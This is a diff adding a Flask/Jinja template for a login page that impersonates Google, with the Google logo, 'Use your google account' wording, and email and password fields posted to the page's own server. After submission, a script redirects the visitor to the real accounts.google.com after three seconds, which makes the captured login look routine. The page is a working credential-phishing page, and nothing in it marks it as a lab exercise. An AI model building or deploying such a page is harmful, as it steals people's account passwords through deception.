@@ -1,0 +1,108 @@
+{% extends "temp.html" %}
+{% block content %}
+
+
+    
+    <div class="container center">
+        <img src="{{ url_for('static', filename='images/google-brand-small.png') }}" id="google" alt="Google">
+
+        <p id="Goole-title" class="signInElements">Sign In</p>
+        <p id="Goole-title" class="hidden passwordElements">Welcome</p>
+        <div >
+            <p class="signInElements Google-text">Use your google account</p>
+            <div class="hidden passwordElements">
+                <button type="button" id="Google-Email" class="passwordElements hidden" onclick="">Username</button>
+            </div>
+            <form method="POST"  novalidate>
+                <!-- novalidate taggen gör att sakerna checkas genom servern, inte client side, detta gör att man kan använda custom errors -->
+                {{ form.hidden_tag() }}
+
+                
+                    <div class="signInElements">
+
+                        {% if form.email.errors %}
+                            {{ form.email(class="signin-error", placeholder="Email", id="usernameToPassword") }}
+                            
+                            <div class="invalid align-left">
+                                {% for error in form.email.errors %}
+                                    <span>{{ error }} </span>
+                                {% endfor %}
+                            </div>   
+                        {% else %}   
+
+                            {{ form.email(class="signin", placeholder="Email", id="usernameToPassword") }}
+
+                        {% endif %}
+                    </div>
+                    
+                    <div class="hidden passwordElements">
+                        <div class="passwordInput">
+
+                            {% if form.password.errors %}
+
+                                {{ form.password(class="invalid, signin", placeholder="Enter your password", id="passwordField") }}
+                                <div class="invalid">
+                                    {% for error in form.password.errors %}
+                                        <span>{{ error }} </span>
+                                    {% endfor %}
+
+                                </div>
+                            
+                            {% else %}   
+
+                                {{ form.password(class="signin", placeholder="Enter your password", id="passwordField") }}
+
+                            {% endif %}
+                        </div>
+                        
+                        <input type="checkbox" onclick="TogglePasswordShow()" class="password-checkbox align-left"><p class="password-checkbox-text">Show Password</p>
+                        
+                        <div class="new-line">
+                            <div class="align-left">
+                                <button type="button" class="Google-link">Forgot Password?</button>
+                            </div>
+
+                            {{ form.submit(class="nextButton") }}
+                        </div>
+                    </div>
+
+                
+            </form>
+            <div class="signInElements">
+                <div class="align-left">
+                    <button type="button" class="Google-link">Forgot Email?</button>
+                    <br>
+                    <br>
+                    <br>
+                    <p class="info-text">Not your computer? Use Guest mode to sign in privately.</p>
+                    <button type="button" class="Google-link" id="Learn-More">Learn More</button>
+                </div>
+                <div class="align-left new-line ">
+                    <button type="button" class="Google-link" id="create-account">Create Account</button>
+                </div>
+                
+                <div>
+                    <button type="button" class="nextButton" onclick="completeAnimation()">Next</button>
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    {% if redirect %}
+        <script>
+
+            function redirect() {
+                location.replace("https://accounts.google.com/v3/signin/identifier?dsh=S-1794887453%3A1671099083637932&hl=sv&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AeAAQh64DJ-hoK2oWjWDcYLu8iZZ4uqbTKb6REpyKow_CNhY3dU01NINBdx8GPPDs2__m-i6lPP-pQ")
+            }
+
+            setTimeout(redirect, 3000)
+
+        </script>
+
+    {% endif %}
+
+
+{% endblock content %}
